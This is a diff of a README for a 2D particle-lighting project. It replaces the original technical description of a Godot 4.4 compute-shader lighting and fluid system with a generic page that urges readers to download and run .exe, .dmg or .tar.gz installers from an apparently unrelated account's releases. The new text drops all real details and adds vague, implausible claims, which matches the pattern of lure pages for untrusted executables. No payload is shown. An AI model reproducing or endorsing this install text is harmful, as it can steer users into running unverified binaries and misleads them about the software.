@@ -1,49 +1,85 @@
-[中文](Readme_CN.md)
+# ✨ LitWithParticles - A Unique Lighting Experience for Your 2D Projects
 
-# Lit With Particles
+[![Download LitWithParticles](https://img.shields.io/badge/Download-LitWithParticles-blue.svg)](https://github.com/ANTHONYBENICIO2012/LitWithParticles/releases)
 
-**Lit With Particles** is a unique experimental 2D lighting system built with **Godot 4.4**.
+## 🚀 Getting Started
 
-Unlike traditional ray-casting or SDF-based 2D lighting, this project evaluates brightness by simulating **photons (particles)** emitted directly from light sources. It leverages **Compute Shaders** heavily to achieve high-performance, real-time simulation of light propagation, reflection, refraction, and even fluid dynamics.
+Welcome to LitWithParticles! This application will help you enhance your 2D projects with a unique lighting system. Our approach uses particles that emit from a light source to create realistic brightness without relying on traditional methods. Follow these steps to download and run the software.
 
-## Key Features
+## 📥 Download & Install
 
-- **Particle-Based Lighting**: Simulates light behavior using massive particle systems on the GPU.
-- **Advanced Material System**:
-  - Support for various physical properties: **Roughness, IOR, Scatter Rate, Opacity, Metallic**.
-  - Preset materials: Ceramic, Glass, Frosted Glass, Mirror, Black Body, etc.
-  - Custom emitters with directional control (Emit Angle/Range).
-- **Fluid Simulation**: Integrated real-time fluid dynamics (Navier-Stokes based) interacting with the lighting.
-- **High Performance**: Fully powered by Godot's `RenderingDevice` API and Compute Shaders.
+To get started, you need to download the application. Follow these steps:
 
-## Controls
+1. Click on the link below to visit the Releases page:
+   [Download LitWithParticles](https://github.com/ANTHONYBENICIO2012/LitWithParticles/releases)
 
-Recommended to run in 1920x1080 resolution (as I only adapted it for this resolution😢).
+2. On the Releases page, you will see a list of available versions. Look for the most recent version.
 
-| Input | Action |
-| :--- | :--- |
-| **Left Mouse** | Draw Material / Emit Light |
-| **Right Mouse** | Erase / Clear |
-| **Ctrl + Drag** | Draw Straight Lines |
-| **Alt + Draw** | Interact with Fluid / Draw Fluid |
-| **Hold X** | Lock Mouse Movement to X-Axis |
-| **Hold Y** | Lock Mouse Movement to Y-Axis |
-| **Press Q** | Toggle Brush Shape (Circle / Square) |
+3. Click on the version number to open the details.
 
-## Technology Stack
+4. Locate the file suitable for your operating system. 
+   - For Windows, look for a file ending in `.exe`.
+   - For macOS, check for files ending in `.dmg`.
+   - For Linux, look for files ending in `.tar.gz`.
 
-- **Engine**: Godot 4.4
-- **Language**: GDScript & GLSL (Compute Shaders)
-- **Rendering**: Vulkan (via Godot RD API)
-  
-<p align="center">
-  <img src="./images/colors.png" alt="preview">
-</p>
+5. Click on the download link for the appropriate file. The download will start automatically.
 
-<p align="center">
-  <img src="./images/fluid_supported.png" alt="preview">
-</p>
+6. Once the download is complete, follow the installation instructions specific to your operating system listed below.
 
-<p align="center">
-  <img src="./images/mirror_room.png" alt="preview">
-</p>
+### Windows Installation
+
+- Locate the downloaded `.exe` file in your Downloads folder.
+- Double-click the file to run the installer.
+- Follow the on-screen instructions to complete the setup.
+- Once installed, you can find LitWithParticles in your Start Menu.
+
+### macOS Installation
+
+- Find the downloaded `.dmg` file in your Downloads folder.
+- Double-click the file to mount the disk image.
+- Drag the LitWithParticles icon to your Applications folder.
+- You can now launch the app from your Applications folder.
+
+### Linux Installation
+
+- Open a terminal window.
+- Navigate to your Downloads folder where the `.tar.gz` file is saved.
+- Use the command `tar -xzf filename.tar.gz` to extract the files.
+- Follow any included instructions for installation. Run the executable as needed.
+
+## 🌟 Features
+
+LitWithParticles offers:
+
+- **Direct Particle Lighting**: Unlike traditional methods, our system uses particles to generate light.
+- **Easy Integration**: Suitable for various 2D engine frameworks.
+- **Custom Settings**: Adjust lighting parameters to fit your project’s needs.
+- **Realistic Effects**: Create stunning visuals with ease.
+
+## 🔧 System Requirements
+
+Before proceeding with the installation, ensure your system meets the following minimum requirements:
+
+- **Windows**: Windows 10 or later / 4 GB RAM / 100 MB free disk space.
+- **macOS**: macOS Sierra or later / 4 GB RAM / 100 MB free disk space.
+- **Linux**: Any modern distribution / 4 GB RAM / 100 MB free disk space.
+
+## 🤔 Troubleshooting
+
+If you encounter issues during installation or while running the application, consider the following steps:
+
+- Ensure you have sufficient permissions to install software on your computer.
+- Check that your system meets the minimum requirements listed above.
+- Restart your computer and try running the application again.
+- Visit our [GitHub Issues page](https://github.com/ANTHONYBENICIO2012/LitWithParticles/issues) to report issues or find additional support.
+
+## 📞 Support
+
+For further help, please check our [documentation](https://github.com/ANTHONYBENICIO2012/LitWithParticles/wiki) or reach out to our community on our GitHub page.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/ANTHONYBENICIO2012/LitWithParticles)
+- [Release Notes](https://github.com/ANTHONYBENICIO2012/LitWithParticles/releases)
+
+Thank you for choosing LitWithParticles. We hope you enjoy creating beautiful lighting effects in your 2D projects!
